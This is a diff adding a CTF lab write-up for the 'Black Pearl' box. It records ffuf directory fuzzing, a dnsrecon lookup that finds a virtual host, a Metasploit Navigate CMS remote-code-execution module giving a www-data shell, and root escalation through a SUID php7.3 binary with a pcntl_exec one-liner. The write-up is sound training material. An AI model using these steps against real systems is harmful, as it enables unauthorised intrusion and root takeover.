@@ -1,0 +1,62 @@
+for port 80:
+	lets fuzz it: $ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.50.111/FUZZ
+		returns secret -> says directory busting wont work... BUST. Moving on
+		
+
+		
+		
+for port 53:
+	lets do recon: $ dnsrecon -r 127.0.0.0/24 -n 192.168.50.111 -d blah (-d for domain - we dont know)
+	returns: 
+			└─$ dnsrecon -r 127.0.0.0/24 -n 192.168.50.111 -d blah
+			[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
+			[+]      PTR blackpearl.tcm 127.0.0.1
+			[+] 1 Records Found
+			
+		lets add that dns to /etc/host on kali and go to http://blackpearl.tcm
+
+	lets fuzz this...
+		returns navigate -> navigate cms =>> has a lot of msfconsole hits on google (https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/)
+		lets use msfconsole 
+			set rhosts 192.168.50.111
+			set vhost blackpearl.tcm
+				meterpreter > shell
+				Process 686 created.
+				Channel 1 created.
+				whoami
+				www-data
+				
+				lets generate a tty shell to see where we are with $ python -c 'import pty; pty.spawn("/bin/bash")' or /bin/sh
+				
+				lets give linpeas a try since we have to escalate privilege
+				
+				linpeas found this =>> -rwsr-xr-x 1 root root 4.6M Feb 13  2021 /usr/bin/php7.3 (Unknown SUID binary!)
+				
+				we can run this as root!!! Its in SUID using https://gtfobins.github.io/gtfobins/php/#suid
+				
+				lets try this /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);" 
+				
+					www-data@blackpearl:~$ /usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
+					/usr/bin/php7.3 -r "pcntl_exec('/bin/sh', ['-p']);"
+					# whoami
+					whoami
+					root
+					# ls
+					ls
+					blackpearl.tcm  html
+					# cd /root      
+					cd /root
+					# ls
+					ls
+					flag.txt
+					# cat flag.txt
+					cat flag.txt
+					Good job on this one.
+					Finding the domain name may have been a little guessy,
+					but the goal of this box is mainly to teach about Virtual Host Routing which is used in a lot of CTF.
+					
+			ROOTED!!! :)
+				
+				
+
+
